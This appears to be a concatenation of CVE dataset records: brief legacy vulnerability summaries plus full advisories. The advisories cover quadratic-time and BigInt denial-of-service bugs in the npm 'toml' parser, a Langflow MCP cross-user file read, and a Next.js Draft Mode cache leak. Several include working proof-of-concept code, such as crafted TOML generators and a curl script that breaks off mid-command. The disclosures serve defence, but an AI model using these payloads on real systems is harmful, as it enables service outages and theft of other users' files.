cves.summary: The Sambar server includes batch files ECHO.BAT and HELLO.BAT in the CGI directory, which allow remote attackers to execute commands via shell metacharacters.
Red Hat 6.0 allows local users to gain root access by booting single user and hitting ^C at the password prompt.
A later variation on the Teardrop IP denial of service attack, a.k.a. Teardrop-2.

Memory leak in Simple Network Management Protocol (SNMP) agent (snmp.exe) for Windows NT 4.0 before Service Pack 4 allows remote attackers to cause a denial of service (memory consumption) via a large number of SNMP packets with Object Identifiers (OIDs) that cannot be decoded.
Quake 2 server allows remote attackers to cause a denial of service via a spoofed UDP packet with a source address of 127.0.0.1, which causes the server to attempt to connect to itself.
Buffer overflow in Apache 1.2.5 and earlier allows a remote attacker to cause a denial of service with a large number of GET requests containing a large number of / characters.
Denial of service through Solaris 2.5.1 telnet by sending ^D characters.
ICMP messages to broadcast addresses are allowed, allowing for a Smurf attack that can cause a denial of service.
AIX routed allows remote users to modify sensitive files.
Progressive Networks Real Video server (pnserver) can be crashed remotely.
htmlscript CGI program allows remote read access to files.
Denial of service in AIX telnet can freeze a system and prevent users from accessing the server.

The system configuration control (sysctl) facility in BSD based operating systems OpenBSD 2.2 and earlier, and FreeBSD 2.2.5 and earlier, does not properly restrict source routed packets even when the (1) dosourceroute or (2) forwarding variables are set, which allows remote attackers to spoof TCP connections.
Vignette StoryServer 5 and Vignette V/5 allows remote attackers to read and modify license information, and cause a denial of service (service halt) by directly accessing the /vgn/license template.

Multiple Cross Site Scripting (XSS) vulnerabilities in Vignette StoryServer 4 and 5, and Vignette V/5 and V/6, allow remote attackers to insert arbitrary HTML and script via text variables, as demonstrated using the errInfo parameter of the default login template.

## Summary

`toml.parse()` is vulnerable to a quadratic-complexity (O(n²)) denial-of-service via many
array-of-tables (`[[name]]`) headers. `addTableArray()` in `lib/compiler.js` rescans two
entire bookkeeping Sets on every `[[name]]` header without pruning unrelated or distinct
entries, so a document containing n such headers costs O(n²) compiler work. A ~321KB document
of 20,000 distinct-named `[[name]]` blocks takes ~10.3 seconds to parse — a completely
ordinary-looking TOML shape (a flat settings block plus one or more array-of-tables sections),
not a contrived edge case. This is a separate, unpatched code path from the previously fixed
stack-overflow DoS (`GHSA-82x6-q7mm-w9cf`) and requires no key nesting or dotted keys at all.

## Affected component / version

- Package: `toml` (npm), repository `BinaryMuse/toml-node`
- Function: `addTableArray()` in `lib/compiler.js`
- Confirmed present in the audited checkout at commit `1b2ac40` (2026-07-16), one commit past
  the `v5.0.0` tag (a changelog-only change) — i.e. present in `v5.0.0`, the latest release.
  Not exhaustively verified against every prior release, but the affected function is
  unrelated to `v5.0.0`'s BigInt/Temporal changes (per `CHANGELOG.md`), so the defect likely
  predates that release as well.

## Details

`toml.parse(input, options)` (`index.js:5-9`) forwards the caller-supplied string to
`parser.parse()` and then `compiler.compile()` with no length or structural validation. Every
`[[name]]` (array-of-tables) header is routed (`reduce()`, `lib/compiler.js:43`) to
`addTableArray()` (`lib/compiler.js:218-245`), which performs two full linear scans on every
call:

```js
assignedPaths.forEach(function(p) {
  if (isSameOrSubPath(p, quotedPath)) assignedPaths.delete(p);
});
valueAssignments.forEach(function(p) {
  if (isSameOrSubPath(p, quotedPath)) valueAssignments.delete(p);
});
```
(`lib/compiler.js:228-233`)

`assignedPaths` and `valueAssignments` accumulate one entry per top-level key/table/array path
ever assigned in the entire document. Each scan prunes only entries matching the *currently
reopened* path via `isSameOrSubPath()` (`lib/compiler.js:319-321`: `path === prefix ||
path.indexOf(prefix + ".") === 0`); anything else — an unrelated top-level key, or simply a
*different* array-of-tables name — is never removed and is rescanned in full on every
subsequent `[[name]]` header for the rest of the parse. `Set.prototype.forEach` has no early
exit, so this is unconditionally O(current Set size) on every call, giving O(n²) total work
for n such headers.

## Proof of Concept

The sharpest reproduction needs no unrelated keys at all — just N array-of-tables headers with
N *distinct* names, since nothing is ever pruned when no name repeats:

```js
const toml = require('toml');

function distinctArrayHeaders(n) {
  let out = '';
  for (let i = 0; i < n; i++) out += `[[a${i}]]\nv = 1\n`;
  return out;
}

// ~321 KB input -- takes ~10.3 seconds
toml.parse(distinctArrayHeaders(20000));
```

Measured timings (Node, direct execution against this repo):

| Variant | n | input size | time |
|---|---|---|---|
| N distinct-named `[[name]]` headers, no unrelated keys | 20,000 | 321 KB | 10.3 s |
| Same N with all-same-name headers (self-pruning, control) | 20,000 | 240 KB | 78 ms |
| M unrelated top-level keys + N same-name `[[name]]` headers | M=N=32,000 | 906 KB | 42.3 s |

The ~130x gap between the distinct-name and same-name cases at identical N and comparable
input size isolates the mechanism precisely: the bug is unbounded Set growth from never-pruned
entries, not string length or any other confound. A product-law check (varying M and N
independently in the mixed variant) further confirmed genuine O(M·N) complexity.

## Impact

Node.js is single-threaded — this synchronous, multi-second-to-tens-of-seconds compile blocks
the entire process event loop, standard uncontested Node.js behavior. The triggering document
shape — flat top-level config keys plus one or more array-of-tables sections (e.g. a `[db]`
settings block plus a `[[servers]]` list) — is unremarkable, common real-world TOML, not an
edge case. No authentication or special access is required; only the ability to get one TOML
string parsed by an application using this library.

## Suggested remediation

Avoid scanning the entire `assignedPaths`/`valueAssignments` Sets on every `[[name]]` header.
Index entries by their top-level path segment (e.g. a `Map<string, Set<string>>` keyed by the
first key component) so `addTableArray()` only ever scans the bucket relevant to the path
being reopened, in time proportional to that bucket's size rather than the whole document's
accumulated path count:

```js
var assignedByRoot = new Map(); // root segment -> Set<fullPath>

function addTableArray(node) {
  var path = node.value;
  var root = path[0];
  var bucket = assignedByRoot.get(root) || new Set();
  bucket.forEach(function(p) {
    if (isSameOrSubPath(p, quotedPath)) bucket.delete(p);
  });
  // ...rest of addTableArray unchanged, reading/writing the per-root bucket
  // instead of the global assignedPaths/valueAssignments Sets
}
```

As with the sibling finding, an input-size or table-count limit would also help as
defense-in-depth.

## Summary

`toml.parse()` is vulnerable to a quadratic-complexity (O(n²)) denial-of-service via a single
long dotted key, table header, or inline-table key. A ~100KB crafted document causes a
multi-second synchronous hang; a ~200KB document crashes the Node.js process outright with an
uncatchable out-of-memory error. This is a separate, unpatched code path from the previously
fixed stack-overflow DoS (`GHSA-82x6-q7mm-w9cf`) — it requires no array/inline-table nesting at
all, and is confirmed unaffected by the `maxDepth` option that fixed that earlier issue.

## Affected component / version

- Package: `toml` (npm), repository `BinaryMuse/toml-node`
- Functions: `assign()`, `deepRef()`, `setNestedKey()` in `lib/compiler.js`
- Confirmed present in the audited checkout at commit `1b2ac40` (2026-07-16), one commit past
  the `v5.0.0` tag (a changelog-only change) — i.e. present in `v5.0.0`, the latest release.
  Not exhaustively verified against every prior release, but the affected functions are
  unrelated to `v5.0.0`'s BigInt/Temporal changes (per `CHANGELOG.md`), so the defect likely
  predates that release as well.

## Details

`toml.parse(input, options)` (`index.js:5-9`) forwards the caller-supplied string to
`parser.parse()` and then `compiler.compile()` with no length or structural validation.
Inside `lib/compiler.js`, three separate functions each walk a dotted key's segments in a
`for` loop and, on **every** iteration, recompute the full path-prefix string from scratch:

- `assign()` (lines 69-107, the sink at line 81): `var intermediatePath =
  makeFullPath(keys.slice(0, i + 1));` — reached for top-level dotted-key assignments like
  `a.b.c = 1`.
- `deepRef()` (lines 247-281, the sink at line 252): the identical pattern via
  `pathKey(keys.slice(0, i + 1))` — reached from table headers `[a.b.c]` and array-of-tables
  `[[a.b.c]]` via `setPath()`/`addTableArray()`.
- `setNestedKey()` (lines 184-202, the sink at line 187): the identical pattern — reached from
  inline-table dotted keys like `t = { a.b.c = 1 }`.

`keys.slice(0, i + 1)` allocates a new array of length `i`; `pathKey()`/`makeFullPath()`
(lines 311-317) then does `.map(quoteDottedString).join(".")`, also O(i). Since this runs on
every one of the `n` segments of a dotted key, total work is `O(1 + 2 + ... + n) = O(n²)`, not
`O(n)`. The string is computed unconditionally on the happy path (only ever *used* if an error
is about to be thrown), so there is no early exit that makes this cheap in practice.

No limit exists anywhere on dotted-key segment count: `dot_ended_table_key_part+` and
`inline_dot_key_part+` in `src/toml.pegjs` (lines 122, 311) are unbounded `+` repetitions,
parsed iteratively rather than through the grammar's `value` rule — so the existing
`MAX_DEPTH`/`maxDepth` nesting guard (`src/toml.pegjs:141-151`, enforced in the generated
`lib/parser.js:1022`) does not apply to key length at all. We confirmed this directly: setting
`options.maxDepth: 1` (the strictest possible value) against a 16,000-segment key produced no
measurable timing difference from the unrestricted case.

## Proof of Concept

```js
const toml = require('toml');

// n-segment dotted key: "k0.k1.k2. ... .k{n-1} = 1"
function segKey(n) {
  const parts = [];
  for (let i = 0; i < n; i++) parts.push('k' + i);
  return parts.join('.') + ' = 1\n';
}

// ~100.9 KB input -- takes ~6.6-6.8 seconds
toml.parse(segKey(16000));

// ~200 KB input -- crashes the Node process:
// "FATAL ERROR: Ineffective mark-compacts near heap limit - JavaScript heap out of memory"
toml.parse(segKey(32000));
```

Measured timings (Node v22, direct execution against this repo):

| n (segments) | input size | time |
|---|---|---|
| 1,000 | ~4.9 KB | 34 ms |
| 8,000 | ~46.9 KB | 1.6 s |
| 16,000 | ~100.9 KB | 6.8 s |
| 32,000 | ~200 KB | **process crash (OOM)** |

Doubling `n` from 8,000→16,000 roughly quadruples runtime (~4.2x), the signature of O(n²)
rather than the expected O(n) (~2x). Independently reproduced with the identical scaling
signature for the table-header variant (`[k0. ... .k15999]`, exercising `deepRef()`) and the
inline-table variant (`t = { k0. ... .k15999 = 1 }`, exercising `setNestedKey()`).

We also generalized this into a property-based fuzzing harness (fast-check, run under Node)
that automatically tests the "doubling input size should not more than roughly double parse
time" invariant across 12 structural dimensions of the grammar/compiler; it independently
re-flags all three code paths above on every run, with no additional dimension confirmed
vulnerable after follow-up investigation. The harness is available on request.

## Impact

Node.js is single-threaded — a synchronous multi-second-to-crashing `parse()` call blocks the
entire event loop of the process calling it, stalling every other request/operation that
process is handling, not just the attacker's own. At the upper end this is not merely a hang:
an uncaught, process-terminating out-of-memory crash from a ~200KB attacker-supplied string is
a full denial of service requiring no authentication — just the ability to get one string
parsed by an application using this library (config upload, API request body, imported
manifest, or any of this library's intended use cases).

## Suggested remediation

Build the path prefix as an incrementally-extended string as the loop walks each segment
(append one already-quoted segment per iteration to a running string) instead of re-slicing an
array and re-joining the entire prefix from scratch on every iteration. For example, in
`assign()`:

```js
function assign(node) {
  var keys = node.key;
  var value = node.value;
  var off = node.offset;
  if (!Array.isArray(keys)) keys = [keys];
  var reduced = reduceValueNode(value);

  var target = context;
  var pathStr = pathKey(currentPath); // computed once, not per segment
  for (var i = 0; i < keys.length - 1; i++) {
    var k = keys[i];
    var quotedK = quoteDottedString(k);
    var intermediatePath = pathStr ? pathStr + "." + quotedK : quotedK; // O(new segment), not O(i)
    pathStr = intermediatePath;
    // ...same conditional logic as today, using intermediatePath
    target = target[k];
  }
  // ...
}
```

The identical treatment applies to `deepRef()` and `setNestedKey()`. As defense-in-depth,
consider also capping total key-segment count or overall input size, the same way `maxDepth`
already caps nesting.

### Summary
`toml.parse()` converts integer literals (hex, octal, binary, and decimal) to `BigInt` without first bounding the length of the digit sequence. Since `BigInt(string)` construction from a very long numeric string runs in super-linear time, a single small, well-formed TOML document containing one long integer literal can pin a Node.js process's event loop at 100% CPU for several seconds — a denial of service for any application that parses attacker-supplied or third-party TOML. No authentication or complex crafting is required.

### Details
In `lib/parser.js`, the grammar actions that build integer nodes call `BigInt()` directly on the matched digit text, with no upper bound on its length:

- `lib/parser.js:326` — hex: `BigInt('0x' + stripUnderscores(digits))`
- `lib/parser.js:327` — octal: `BigInt('0o' + stripUnderscores(digits))`
- `lib/parser.js:328` — binary: `BigInt('0b' + stripUnderscores(digits))`
- `lib/parser.js:329` — decimal: `BigInt(stripUnderscores(text))`

The parser does enforce a nesting-depth limit (`MAX_DEPTH`, default 500, `lib/parser.js:4343`) to guard against stack overflow from deeply nested arrays/inline tables (per GHSA-82x6-q7mm-w9cf). However, that guard only bounds *structural nesting* — it does not bound the length of a single scalar token.

The subsequent 64-bit range check in `lib/compiler.js` (`reduceInteger`, lines 143–150, comparing against `INT64_MIN` / `INT64_MAX` defined at lines 3–4) happens **after** the expensive `BigInt()` conversion has already completed. It therefore provides no protection against this cost — the CPU time is already spent by the time the value is rejected as out of range.

### PoC

```js
const toml = require('toml');

const N = 5_000_000; // ~5 MB request body
const doc = 'x = 0x' + 'f'.repeat(N);

const start = Date.now();
try {
  toml.parse(doc); // eventually throws "outside the 64-bit signed integer range" —
                    // but only after the costly conversion has run
} catch (e) {}

console.log('elapsed:', Date.now() - start, 'ms');
```

**Measured results:**

| Digits (hex) | Approx. payload size | Parse time |
|---:|---:|---:|
| 200,000 | ~200 KB | 141 ms |
| 400,000 | ~400 KB | 276 ms |
| 800,000 | ~800 KB | 685 ms |
| 1,600,000 | ~1.6 MB | 1,761 ms |
| 5,000,000 | ~5 MB | 6,061 ms |

Growth is clearly super-linear. The same behavior reproduces for plain decimal literals (3,000,000 `'9'` digits → ~6.3 s).

### Impact
Any application that calls `toml.parse()` on untrusted or third-party input — config upload endpoints, CI/CD tools ingesting user-supplied `.toml` files, package managers, linters, editors/language servers — is exposed.

During the conversion, the event loop is fully blocked. In a typical single-threaded Node.js server this stalls **all** concurrent request handling, not just the request containing the malicious payload. A single ~5 MB request is sufficient to cause several seconds of full CPU denial of service.

**Suggested fix:** Reject digit sequences above a reasonable length *before* calling `BigInt()`, analogous to the existing `maxDepth` option. A 64-bit signed integer requires at most 20 decimal digits or 16 hex digits, so any digit sequence significantly longer than that is guaranteed to fail the existing range check anyway, and can be rejected with a cheap `.length` comparison instead of paying for the full `BigInt` conversion.

The IMAP Client for Sylpheed 0.8.11 allows remote malicious IMAP servers to cause a denial of service (crash) via certain large literal size values that cause either integer signedness errors or integer overflow errors.

cwe.name: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

cves.summary:
### Summary
Langflow's project-scoped MCP transport authenticates the caller for the `project_id` in the connection URL, but the subsequent `resources/read` operation does not authorize the resource URI being requested. An authenticated user can connect to their own project-scoped MCP endpoint and supply a crafted file-download URI that points to another user's flow-backed file. The server then reads and returns the victim file without verifying ownership or project membership.

This is a cross-user authorization bypass (`userA -> userB`) that allows arbitrary read access to files stored under other users' flow namespaces.

### Details
Verified against local checkout:

- Repository: `langflow-ai/langflow`
- Verified on release tag: `v1.8.3`
- Commit: `08bf98404cfd7737fde57a2588785766cdf1b42e`
- Earliest stable release known to contain the vulnerable code path: `v1.6.8`

Relevant code path:

1. `src/backend/base/langflow/api/v1/mcp_projects.py:147-193`
   `verify_project_auth_conditional()` authenticates the caller and checks access only to the `project_id` in the MCP transport URL.

2. `src/backend/base/langflow/api/v1/mcp_projects.py:1238-1241`
   The project-scoped MCP server registers `read_resource()` and forwards the attacker-controlled URI directly to `handle_read_resource(uri=uri)`.

3. `src/backend/base/langflow/api/v1/mcp_utils.py:163-182`
   `handle_read_resource()` parses the last two URI path segments as `flow_id` and `filename`, then directly calls:

   ```python
   storage_service.get_file(flow_id=flow_id, file_name=filename)
   ```

   No check ties the supplied `flow_id` back to the authenticated user or the current project.

4. `src/backend/base/langflow/services/storage/local.py:141-149`
   `src/backend/base/langflow/services/storage/s3.py:200-217`
   The storage layer performs a raw namespace read and is not authorization-aware.

The result is that authorization is enforced at MCP connection time, but not at resource-read time. Once an attacker has access to any project-scoped MCP endpoint they own, they can read another user's flow-backed file by passing a victim-controlled URI.

This issue is also easier to exploit because the global MCP helpers expose cross-user discovery data:

- `src/backend/base/langflow/api/v1/mcp_utils.py:102-121`
  `handle_list_resources(project_id=None)` lists files for all flows.
- `src/backend/base/langflow/api/v1/mcp_utils.py:333-380`
  `handle_list_tools(project_id=None)` queries all flows and includes flow IDs in tool metadata.

That global enumeration is not required for exploitation, but it makes obtaining victim identifiers much easier.

### PoC
Preconditions:

- Langflow is running locally with authentication enabled.
- Two separate users exist on the same instance.
- The victim has a flow with an uploaded file.
- The attacker has access to any project they own.

Verify the issue locally by starting Langflow with:

```bash
cd '/Users/r1zzg0d/Documents/CVE hunting/targets/langflow'

set -a
source .env.verify
set +a

export LANGFLOW_CONFIG_DIR="$PWD/.langflow-verify"

uv run python - <<'PY'
from langflow.main import setup_app
import uvicorn

app = setup_app(backend_only=True)
uvicorn.run(app, host="127.0.0.1", port=7860, log_level="debug")
PY
```

Then, in a second terminal, the following script creates a victim user, an attacker user, a victim flow-backed file, and demonstrates that:

- the normal file download route is blocked for the attacker (`404`)
- the same file is readable through the attacker's own project-scoped MCP connection

```bash
cd '/Users/r1zzg0d/Documents/CVE hunting/targets/langflow'
set -euo pipefail

export BASE='http://127.0.0.1:7860'
export PASS='Passw0rd!Passw0rd!'
export VICTIM_USER="victim.$RANDOM@example.com"
export ATTACKER_USER="attacker.$RANDOM@example.com"

curl -sS -X POST "$BASE/api/v1/users/" \
  -H 'Content-Type: application/json' \
  -d "{\"username\":\"$VICTIM_USER\",\"password\":\"$PASS\"}" >/dev/null

curl -sS -X POST "$BASE/api/v1/users/" \
  -H 'Content-Type: application/json' \
  -d "{\"username\":\"$ATTACKER_USER\",\"password\":\"$PASS\"}" >/dev/null

export VICTIM_TOKEN=$(
  curl -sS -X POST "$BASE/api/v1/login" \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    --data-urlencode "username=$VICTIM_USER" \
    --data-urlencode "password=$PASS" | jq -r '.access_token'
)

export ATTACKER_TOKEN=$(
  curl -sS -X POST "$BASE/api/v1/login" \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    --data-urlencode "username=$ATTACKER_USER" \
    --data-urlencode "password=$PASS" | jq -r '.access_token'
)

export VICTIM_PROJECT_ID=$(
  curl -sS -X POST "$BASE/api/v1/projects/" \
    -H "Authorization: Bearer $VICTIM_TOKEN" \
    -H 'Content-Type: application/json' \
    -d '{"name":"victim-project"}' | jq -r '.id'
)

export ATTACKER_PROJECT_ID=$(
  curl -sS -X POST "$BASE/api/v1/projects/" \
    -H "Authorization: Bearer $ATTACKER_TOKEN" \
    -H 'Content-Type: application/json' \
    -d '{"name":"attacker-project"}' | jq -r '.id'
)

export VICTIM_FLOW_ID=$(
  curl -sS -X POST "$BASE/api/v1/flows/" \
    -H "Authorization: Bearer $VICTIM_TOKEN" \
    -H 'Content-Type: application/json' \
    -d "{\"name\":\"victim-flow\",\"data\":{\"nodes\":[],\"edges\":[]},\"folder_id\":\"$VICTIM_PROJECT_ID\"}" \
    | jq -r '.id'
)

printf 'cross-project-read-proof\n' > /tmp/secret.txt

export UPLOAD_JSON=$(
  curl -sS -X POST "$BASE/api/v1/files/upload/$VICTIM_FLOW_ID" \
    -H "Authorization: Bearer $VICTIM_TOKEN" \
```

Expected output:

```text
Direct /files/download as attacker -> 404
Project-scoped MCP resources/read -> cross-project-read-proof
```

Observed server logs during verification:

```text
GET /api/v1/files/download/... 404 Not Found
POST /api/v1/mcp/project/<attacker-project-id>/streamable 200 OK
POST /api/v1/mcp/project/<attacker-project-id>/streamable 202 Accepted
POST /api/v1/mcp/project/<attacker-project-id>/streamable 200 OK
```

### Impact
This is an authenticated IDOR / arbitrary file read issue in the MCP layer.

Any authenticated Langflow user who can access at least one project-scoped MCP endpoint can read files belonging to other users by supplying a victim file URI to `resources/read`.

Practical impact includes:

- Cross-user disclosure of uploaded documents, CSV files, JSON files, prompts, and other flow-backed artifacts
- Unauthorized access to sensitive business data stored in flow namespaces
- Easier exploitation when global MCP helpers reveal other users' flow IDs and file names

### Suggested Remediations
1. Authorize `resources/read` against the authenticated context before calling storage.
   Resolve `flow_id` to a database object and require both:
   `flow.user_id == current_user.id`
   and, for project-scoped transports, `flow.folder_id == current_project_id`.

2. Stop trusting arbitrary file-download URIs as resource identifiers.
   Instead, return opaque server-generated resource IDs from `resources/list` and resolve them server-side to an already authorized object.

3. Scope global MCP enumeration helpers to the authenticated user.
   `handle_list_resources()` and `handle_list_tools()` should not query all flows when `project_id=None`; they should return only flows owned by the current user, or require elevated privileges for broader discovery.

### Fix Status (Maintainer Triage Update — 2026-09-22)

This report is accurate. The vulnerable code path described above (missing
ownership check in `handle_read_resource()`) has since been fixed.

**Corrected affected version range:** `>= 1.6.8, <= 1.9.0` (not `<= 1.8.3` —
confirmed still vulnerable through `v1.9.0`; the fix landed with the `v1.9.1`
release, not later).

**Fixed in:** `v1.9.1` (GitHub Release published 2026-04-24), via PR
[#12818 — "fix(mcp): close path traversal + cross-user disclosure (PVR0754098)"](https://github.com/langflow-ai/langflow/pull/12818).
- Backport commit on `release-1.9.1`: `f0fd436fe9829192ee550e6cb46961a01dd37032`
- Corresponding commit on `main`: `b8fe970493fd5fb2e1fc71dfccc79f90b76058fa`

The fix:
- `handle_read_resource()` now requires an authenticated user context and
  resolves the namespace segment of the URI to a `Flow` row scoped to
  `Flow.user_id == current_user.id`, additionally filtering on
  `Flow.folder_id == project_id` for project-scoped MCP servers
  (`src/backend/base/langflow/api/v1/mcp_utils.py`).
- Rejects filenames containing `..`, `/`, or `\` as defense-in-depth against
  path traversal, and applies the same containment check to the storage
  layer's `get_file`/`get_file_stream`/`delete_file`/`get_file_size`
  (`local.py`/`s3.py`, both in `langflow` and `lfx`).
- `handle_list_resources()` / `handle_list_tools()` are now scoped to
  `current_user.id` on the global (non-project) MCP server, closing the
  cross-user enumeration this report also flagged.

Verified independently against `langflow-ai/langflow` @ `89444c3bb5`
(release-1.11.0 branch, current as of 2026-09-22): the fix is present, and
the regression suite (`src/backend/tests/unit/api/v1/test_mcp_utils.py`,
21/21 passing) includes `test_handle_read_resource_denies_other_users_flow`,
which reproduces this report's exact cross-user scenario and asserts it now
raises `ValueError("... access denied")`.

Pending `use cache` fills are shared across requests for the same key without distinguishing Draft Mode requests from regular requests. When two such requests overlap, the second request receives the first request's fill:

- A regular request that overlaps an editor's Draft Mode request receives unpublished content, without any authentication.
- A Draft Mode request that overlaps a regular request receives published content instead of the draft.

If the overlapping regular request prerenders a page — for example an on-demand prerender of a route that was not prerendered at build time — the unpublished content can be persisted into the generated page and served to all later visitors of that route until the page is revalidated. Since cached functions can be shared across routes, the poisoned page does not need to be the page the editor is previewing.

Sites are affected if they enable Cache Components (or `experimental.useCache`) and serve Draft Mode previews whose cached functions return draft-dependent content.
